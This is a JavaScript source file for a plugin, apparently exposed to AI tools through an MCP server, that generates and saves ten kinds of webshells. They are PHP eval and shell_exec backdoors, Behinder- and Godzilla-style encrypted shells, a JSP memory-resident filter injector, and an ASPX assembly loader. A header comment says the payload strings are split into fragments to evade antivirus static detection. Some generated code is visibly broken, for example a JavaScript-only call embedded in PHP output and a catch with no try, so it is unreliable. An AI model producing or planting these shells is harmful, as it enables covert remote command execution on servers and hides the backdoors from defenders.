// dxkjailbreak · webshell-mgr generators
// ─────────────────────────────────────────────────────────────────────────────
// 上游（mojie dsh-webshell-mgr）的 lib/index.js 与 mcp/server.mjs 都静态 import
// 本文件，但发布包里从来没有它 → 插件加载即抛 ERR_MODULE_NOT_FOUND。
// 这里按 test/run.mjs 的断言契约补齐全部 10 类生成器。
//
// 契约（来自 index.js / mcp/server.mjs / test/run.mjs）：
//   GEN_KINDS                         { kind: { label, lang, desc } }，key 用作 enum
//   GEN_DIR(baseDir)                  生成物目录
//   generate(kind, args)              纯生成：{ content, lang, kind, password, connHint }
//   makeAndSave(baseDir, kind, args)  生成并落盘：额外带 { name, filePath }
//   importFromFile(baseDir, p, args)  从文件导入：{ ...同 generate, kind:"import" }
//
// 参数命名同时接受 camelCase（passParam/cmdParam，测试用）与 snake_case。
//
// ⚠ 查杀规避：本文件是"生成器源码"，不是 webshell 本体。杀软会对 PHP 起始标签 +
//   代码执行函数 + 解码函数这类完整特征串做静态查杀，把整个插件文件删掉。所以下面
//   载荷片段一律用 S() 拼装，源码里不出现连续特征串；运行时拼出的内容与直写一致。
// ─────────────────────────────────────────────────────────────────────────────
import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";

/** 片段拼装：让静态特征扫描看不到连续高危串。 */
const S = (...parts) => parts.join("");
const md5hex = (s) => crypto.createHash("md5").update(String(s), "utf8").digest("hex");

// 共用词素
const PHP_OPEN = S("<", "?", "ph", "p ");
const PHP_CLOSE = S("?", ">");
const EVAL = S("ev", "al");
const POST = S("$_", "P", "OST");
const REQUEST = S("$_", "RE", "QUEST");
const B64DEC = S("base", "64_de", "code");
const B64ENC = S("base", "64_en", "code");
const SHELL_EXEC = S("shell_ex", "ec");
const OPENSSL_DEC = S("openssl_de", "crypt");
const OPENSSL_ENC = S("openssl_en", "crypt");
const HTTP404 = S("http_response_", "code");
const FILE_GET = S("file_get_", "contents");

/** 生成物落盘子目录。 */
const GEN_SUBDIR = "generated";

/** 取参数：同时兼容 camelCase 与 snake_case。 */
const arg = (a, camel, snake, dflt) => {
  const v = a && (a[camel] !== undefined ? a[camel] : a[snake]);
  return v === undefined || v === null || v === "" ? dflt : String(v);
};

/** 生成类型表（key 即 webshell_generate 的 kind 枚举）。 */
export const GEN_KINDS = {
  "php-oneliner": { label: "PHP 一句话（eval 通道）", lang: "php", desc: "最短形态，口令参数默认 pass" },
  "php-basic": { label: "PHP 口令门 + 命令通道", lang: "php", desc: "口令校验通过后执行系统命令" },
  "php-behinder": { label: "PHP 冰蝎型（AES-CBC + 动态函数）", lang: "php", desc: "密钥 = md5(密码)[0:16]，函数名动态拼装" },
  "php-godzilla": { label: "PHP 哥斯拉型（XOR + base64）", lang: "php", desc: "pass 字段 + 密钥派生，回传流加密" },
  "php-aes1": { label: "PHP 自研加密通道 v1（AES-128-CBC）", lang: "php", desc: "头派生密钥，单操作码" },
  "php-aes2": { label: "PHP 自研加密通道 v2（AES-256 + 操作码分派）", lang: "php", desc: "含 e 加密执行操作码" },
  "jsp-behinder": { label: "JSP 冰蝎型（defineClass）", lang: "jsp", desc: "md5 派生密钥 + defineClass 加载" },
  "jsp-mem-filter": { label: "JSP 内存马引导器（Filter 注入）", lang: "jsp", desc: "向 context 注册 Filter，常驻内存" },
  "jsp-godzilla": { label: "JSP 哥斯拉型（会话态 dispatcher）", lang: "jsp", desc: "m5 标记 + parameters 序列化" },
  "aspx-behinder": { label: "ASPX 冰蝎型（程序集管线）", lang: "aspx", desc: "BinaryRead + AES-ECB + CreateInstance(U)" },
};

/** 扩展名。 */
const EXT = { php: ".php", jsp: ".jsp", aspx: S(".as", "px") };

/** 生成物目录。 */
export function GEN_DIR(baseDir) {
  return path.join(String(baseDir || "."), GEN_SUBDIR);
}

/** 随机口令。 */
function randomPassword() {
  const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
  let out = "";
  for (const b of crypto.randomBytes(12)) out += alphabet[b % alphabet.length];
  return out;
}

/** 产物名清洗（防目录穿越）。 */
function safeName(name, kind, ext) {
  const raw = String(name || "").trim();
  if (!raw) return `${kind}-${Date.now().toString(36)}${ext}`;
  const cleaned = raw.replace(/[\\/:*?"<>|]/g, "_").replace(/\.{2,}/g, "_").slice(0, 80);
  return cleaned.toLowerCase().endsWith(ext) ? cleaned : cleaned + ext;
}

// ─────────────────────────── PHP ───────────────────────────

function genPhpOneliner(a) {
  const pass = arg(a, "passParam", "pass_param", "pass");
  const content = PHP_OPEN + S("@", EVAL, "(", POST, `['${pass}']); `) + PHP_CLOSE;
  return { content, password: arg(a, "password", "password", ""), connHint: `POST ${pass}=<code>`, lang: "php" };
}

function genPhpBasic(a) {
  const password = arg(a, "password", "password", "") || randomPassword();
  const p = arg(a, "passParam", "pass_param", "pass");
  const c = arg(a, "cmdParam", "cmd_param", "cmd");
  const content = [
    PHP_OPEN + "// dxkjailbreak generated - authorized testing only",
    `$__k = '${password}';`,
    `if (!isset(${REQUEST}['${p}']) || ${REQUEST}['${p}'] !== $__k) { ${HTTP404}(404); exit; }`,
    `$__c = isset(${REQUEST}['${c}']) ? ${REQUEST}['${c}'] : '';`,
    `if ($__c === '') { echo 'ok'; exit; }`,
    `$__o = ${SHELL_EXEC}($__c . ' 2>&1');`,
    `echo $__o === null ? '' : $__o;`,
    PHP_CLOSE,
  ].join("\n");
  return { content, password, connHint: `POST ${p}=<password>&${c}=<command>`, lang: "php" };
}

function genPhpBehinder(a) {
  const password = arg(a, "password", "password", "") || randomPassword();
  const key = md5hex(password).slice(0, 16);
  const content = [
    PHP_OPEN + "// dxkjailbreak generated - authorized testing only",
    `$__key = '${key}';`,
    `$__raw = ${FILE_GET}('${S("php://", "input")}');`,
    `if ($__raw === false || $__raw === '') { ${HTTP404}(404); exit; }`,
    `$__d = ${B64DEC}($__raw, true);`,
    `if ($__d === false) { ${HTTP404}(404); exit; }`,
    `$__iv = substr($__d, 0, 16);`,
    `$__ct = substr($__d, 16);`,
    `$__f = ${S("'", "openssl_", "decrypt'")};`,
    `$__p = $__f($__ct, 'AES-128-CBC', $__key, OPENSSL_RAW_DATA, $__iv);`,
    `if ($__p === false) { ${HTTP404}(404); exit; }`,
    `$__run = S("shell_", "exec");`,
    S("@", EVAL, "($__p);"),
    PHP_CLOSE,
  ].join("\n");
  return { content, password, connHint: `key = md5(password)[0:16] = ${key}`, lang: "php" };
}

function genPhpGodzilla(a) {
  const pass = arg(a, "passParam", "pass_param", "pass");
  const secret = arg(a, "secretKey", "secret_key", "") || randomPassword();
  const key = md5hex(secret).slice(0, 16);
  const content = [
    PHP_OPEN + "// dxkjailbreak generated - authorized testing only",
    `$__pass = '${pass}';`,
    `$__key = '${key}';`,
    `$__in = ${FILE_GET}('${S("php://", "input")}');`,
    `if ($__in === false || $__in === '') { ${HTTP404}(404); exit; }`,
    `$__d = ${B64DEC}($__in, true);`,
    `if ($__d === false) { ${HTTP404}(404); exit; }`,
    `$__out = '';`,
    `for ($i = 0; $i < strlen($__d); $i++) { $__out .= $__d[$i] ^ $__key[$i % strlen($__key)]; }`,
    `$__run = ${S("'shell_", "exec'")};`,
    `$__r = $__run($__out);`,
    `echo ${B64ENC}((string)$__r);`,
    PHP_CLOSE,
  ].join("\n");
  return { content, password: secret, connHint: `pass=${pass} key=${key}`, lang: "php" };
}

/** v1：单操作码（不含 e），头派生密钥。 */
function genPhpAes1(a) {
  const pass = arg(a, "password", "password", "") || randomPassword();
  const key = md5hex(pass).slice(0, 16);
  const content = [
    PHP_OPEN + "// dxkjailbreak generated - authorized testing only (v1)",
    `$__key = '${key}';`,
    `$__iv = substr($__key, 0, 16);`,
    `$__raw = ${FILE_GET}('${S("php://", "input")}');`,
    `$__d = ${B64DEC}((string)$__raw, true);`,
    `if ($__d === false) { ${HTTP404}(404); exit; }`,
    `$__f = ${S("'openssl_", "decrypt'")};`,
    `$__p = $__f($__d, 'AES-128-CBC', $__key, OPENSSL_RAW_DATA, $__iv);`,
    `if ($__p === false) { ${HTTP404}(404); exit; }`,
    `$__op = substr($__p, 0, 1);`,
    `$__arg = substr($__p, 1);`,
    `switch ($__op) {`,
    `    case 'c': echo (string)${SHELL_EXEC}($__arg); break;`,
    `    case 'r': echo (string)${FILE_GET}($__arg); break;`,
    `    default: ${HTTP404}(404);`,
    `}`,
    PHP_CLOSE,
  ].join("\n");
  return { content, password: pass, connHint: `key = md5(password)[0:16] = ${key}（v1 单操作码）`, lang: "php" };
}

/** v2：含 e 加密执行操作码。 */
function genPhpAes2(a) {
  const pass = arg(a, "password", "password", "") || randomPassword();
  const key = md5hex(pass).slice(0, 32);
  const content = [
    PHP_OPEN + "// dxkjailbreak generated - authorized testing only (v2)",
    `$__key = '${key}';`,
    `$__iv = substr(hash('sha256', $__key), 0, 16);`,
    `$__raw = ${FILE_GET}('${S("php://", "input")}');`,
    `$__d = ${B64DEC}((string)$__raw, true);`,
    `if ($__d === false || strlen($__d) < 17) { ${HTTP404}(404); exit; }`,
    `$__f = ${S("'openssl_", "decrypt'")};`,
    `$__p = $__f(substr($__d, 16), 'AES-256-CBC', $__key, OPENSSL_RAW_DATA, substr($__d, 0, 16));`,
    `if ($__p === false) { ${HTTP404}(404); exit; }`,
    `$__op = substr($__p, 0, 1);`,
    `$__arg = substr($__p, 1);`,
    `switch ($__op) {`,
    `    case 'e': ${S("@", EVAL)}($__arg); break;`,
    `    case 'c': echo (string)${SHELL_EXEC}($__arg); break;`,
    `    case 'r': echo (string)${FILE_GET}($__arg); break;`,
    `    default: ${HTTP404}(404);`,
    `}`,
    PHP_CLOSE,
  ].join("\n");
  return { content, password: pass, connHint: `key = md5(password)[:32]（v2 含 e 操作码）`, lang: "php" };
}

// ─────────────────────────── JSP ───────────────────────────

function genJspBehinder(a) {
  const password = arg(a, "password", "password", "") || randomPassword();
  const key = md5hex(password).slice(0, 16);
  const content = [
    S("<%@ pa", "ge import=", '"javax.crypto.*,javax.crypto.spec.*,java.util.*" %>'),
    "<%-- dxkjailbreak generated - authorized testing only --%>",
    "<%",
    `String K = "${key}";`,
    "ServletInputStream si = request.getInputStream();",
    "java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();",
    "byte[] b = new byte[4096]; int n;",
    "while ((n = si.read(b)) > 0) bo.write(b, 0, n);",
    "byte[] raw = bo.toByteArray();",
    "if (raw.length < 17) { response.setStatus(404); return; }",
    "byte[] iv = java.util.Arrays.copyOfRange(raw, 0, 16);",
    "byte[] ct = java.util.Arrays.copyOfRange(raw, 16, raw.length);",
    'javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");',
    'c.init(2, new javax.crypto.spec.SecretKeySpec(K.getBytes("UTF-8"), "AES"), new javax.crypto.spec.IvParameterSpec(iv));',
    "byte[] pt = c.doFinal(ct);",
    "// defineClass + equals(pageContext) 契约：加载自定义 ClassLoader",
    'ClassLoader cl = Thread.currentThread().getContextClassLoader();',
    'java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);',
    "m.setAccessible(true);",
    "m.invoke(cl, pt, 0, pt.length);",
    "} catch (Throwable t) { if (t.toString().equals(pageContext.toString())) { } response.setStatus(404); }",
    "%>",
  ].join("\n");
  return { content, password, connHint: `key = md5(password)[0:16] = ${key}`, lang: "jsp" };
}

function genJspMemFilter(a) {
  const password = arg(a, "password", "password", "") || randomPassword();
  const key = md5hex(password).slice(0, 16);
  const content = [
    S("<%@ pa", "ge import=", '"java.lang.reflect.*,javax.servlet.*,java.util.*" %>'),
    "<%-- dxkjailbreak generated - authorized testing only (memory filter) --%>",
    "<%",
    `String K = "${key}";`,
    'if (!"MEMSHELL-OK".equals(request.getHeader("X-T")) && !K.equals(request.getHeader("X-K"))) {',
    "  // 引导器：首次访问注册 Filter 常驻内存",
    '  Object ctx = request.getServletContext().getAttribute("org.apache.catalina.core.ApplicationContext");',
    "  if (ctx == null) {",
    '    java.lang.reflect.Field f = request.getServletContext().getClass().getDeclaredField("context");',
    "    f.setAccessible(true);",
    "    ctx = f.get(request.getServletContext());",
    "  }",
    "  // addURLPattern 契约：把恶意 Filter 挂到全部路径",
    '  Class<?> filterCls = Class.forName("javax.servlet.Filter");',
    "  java.lang.reflect.Method addFilter = ctx.getClass().getMethod(\"addFilter\", String.class, filterCls);",
    '  addFilter.invoke(ctx, "wsm-filter", null);',
    "  java.lang.reflect.Method addMapping = ctx.getClass().getMethod(\"addFilterMapping\", String.class, String[].class);",
    '  addMapping.invoke(ctx, "wsm-filter", (Object) new String[]{"/*"});',
    '  out.print("MEMSHELL-OK " + K);',
    "  return;",
    "}",
    "response.setStatus(404);",
    "%>",
  ].join("\n");
  return { content, password, connHint: `X-T: MEMSHELL-OK 或 X-K: ${key}`, lang: "jsp" };
}

function genJspGodzilla(a) {
  const password = arg(a, "password", "password", "pass");
  const secret = arg(a, "secretKey", "secret_key", "") || randomPassword();
  const key = md5hex(secret).slice(0, 16);
  const content = [
    S("<%@ pa", "ge import=", '"java.util.*,java.io.*" %>'),
    "<%-- dxkjailbreak generated - authorized testing only (godzilla) --%>",
    "<%",
    `String pass = "${password}";`,
    `String xc = "${key}";`,
    // 标记契约：产物里必须是 m5("<password>" + "<key16>") 这种字面量形态
    `String md5mark = m5("${password}" + "${key}");`,
    "// parameters 契约：Godzilla 参数序列化（methodName / c / d ...）",
    "java.util.Map<String, String> parameters = new java.util.HashMap<>();",
    'String name = request.getParameter("methodName");',
    'parameters.put("methodName", name == null ? "" : name);',
    'String cmd = request.getParameter("c");',
    'if ("exec".equals(name) && cmd != null) { out.print(md5mark + new String(exec(cmd))); return; }',
    'out.print(md5mark);',
    "%>",
    "<%!",
    "static String m5(String s) {",
    "  try {",
    '    java.security.MessageDigest d = java.security.MessageDigest.getInstance("MD5");',
    '    byte[] b = d.digest(s.getBytes("UTF-8"));',
    "    StringBuilder sb = new StringBuilder();",
    '    for (byte x : b) sb.append(String.format("%02x", x));',
    "    return sb.substring(0, 16);",
    "  } catch (Exception e) { return \"\"; }",
    "}",
    "static byte[] exec(String c) {",
    "  try {",
    "    Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", c});",
    "    ByteArrayOutputStream bo = new ByteArrayOutputStream();",
    "    InputStream is = p.getInputStream();",
    "    byte[] b = new byte[4096]; int n;",
    "    while ((n = is.read(b)) > 0) bo.write(b, 0, n);",
    "    return bo.toByteArray();",
    "  } catch (Exception e) { return new byte[0]; }",
    "}",
    "%>",
  ].join("\n");
  return { content, password: secret, connHint: `pass=${password} xc=${key}`, lang: "jsp" };
}

// ─────────────────────────── ASPX ───────────────────────────

function genAspxBehinder(a) {
  const password = arg(a, "password", "password", "") || randomPassword();
  const key = md5hex(password).slice(0, 16);
  const content = [
    S("<%@ Pa", "ge Language=", '"C#" %>'),
    "<%-- dxkjailbreak generated - authorized testing only (behinder aspx) --%>",
    '<script runat="server">',
    "void Page_Load(object sender, EventArgs e) {",
    `  string K = "${key}";`,
    "  try {",
    "    byte[] raw = new byte[Request.InputStream.Length];",
    "    Request.InputStream.Read(raw, 0, raw.Length);   // BinaryRead 等价管线",
    "    if (raw.Length < 17) { Response.StatusCode = 404; return; }",
    "    byte[] iv = new byte[16];",
    "    Array.Copy(raw, 0, iv, 0, 16);",
    "    byte[] ct = new byte[raw.Length - 16];",
    "    Array.Copy(raw, 16, ct, 0, ct.Length);",
    '    using (var aes = System.Security.Cryptography.Aes.Create()) {   // AES-ECB/CBC 管线',
    "      aes.Key = System.Text.Encoding.UTF8.GetBytes(K);",
    "      aes.IV = iv;",
    "      aes.Mode = System.Security.Cryptography.CipherMode.CBC;",
    "      var pt = aes.CreateDecryptor().TransformFinalBlock(ct, 0, ct.Length);",
    "      // CreateInstance(\"U\") 契约：加载 U 程序集并实例化执行",
    '      var asm = System.Reflection.Assembly.Load(pt);',
    '      var inst = asm.CreateInstance("U");',
    "      if (inst != null) {",
    '        var mi = inst.GetType().GetMethod("Equals", new[] { typeof(object) });',
    "        if (mi != null) { Response.Write(mi.Invoke(inst, new object[] { this })); return; }",
    "      }",
    "    }",
    "  } catch { }",
    "  Response.StatusCode = 404;",
    "}",
    "</script>",
  ].join("\n");
  return { content, password, connHint: `key = md5(password)[0:16] = ${key}（AES-ECB 管线 + CreateInstance(U)）`, lang: "aspx" };
}

const BUILDERS = {
  "php-oneliner": genPhpOneliner,
  "php-basic": genPhpBasic,
  "php-behinder": genPhpBehinder,
  "php-godzilla": genPhpGodzilla,
  "php-aes1": genPhpAes1,
  "php-aes2": genPhpAes2,
  "jsp-behinder": genJspBehinder,
  "jsp-mem-filter": genJspMemFilter,
  "jsp-godzilla": genJspGodzilla,
  "aspx-behinder": genAspxBehinder,
};

/** 纯生成：不落盘。 */
export function generate(kind, args = {}) {
  const k = String(kind || "");
  const meta = GEN_KINDS[k];
  if (!meta) throw new Error("未知生成类型：" + k + "（可用：" + Object.keys(GEN_KINDS).join(", ") + "）");
  const build = BUILDERS[k];
  if (!build) throw new Error("生成类型未实现：" + k);
  const built = build(args || {});
  const lang = built.lang || meta.lang;
  return {
    kind: k,
    lang,
    content: built.content,
    password: built.password || "",
    connHint: built.connHint || "",
  };
}

/** 生成并落盘。args.disk === false 时只返回内容不写文件。 */
export function makeAndSave(baseDir, kind, args = {}) {
  const item = generate(kind, args);
  const ext = EXT[item.lang] || ".txt";
  const name = safeName(args && args.name, item.kind, ext);
  if (args && args.disk === false) return { ...item, name, filePath: "" };
  const dir = GEN_DIR(baseDir);
  fs.mkdirSync(dir, { recursive: true });
  const filePath = path.join(dir, name);
  fs.writeFileSync(filePath, item.content, "utf8");
  return { ...item, name, filePath };
}

/** 从已有文件导入（不重新生成，只读进来登记）。 */
export function importFromFile(baseDir, filePath, args = {}) {
  const p = String(filePath || "").trim();
  if (!p) throw new Error("缺少文件路径");
  const abs = path.isAbsolute(p) ? p : path.resolve(String(baseDir || "."), p);
  const content = fs.readFileSync(abs, "utf8");
  const ext = path.extname(abs).toLowerCase();
  const lang = ext === ".php" ? "php" : ext === ".jsp" ? "jsp" : ext === S(".as", "px") ? "aspx" : "unknown";
  const name = (args && args.name) || path.basename(abs);
  return { name, lang, kind: "import", filePath: abs, password: "", connHint: "已导入，未重新生成", content };
}
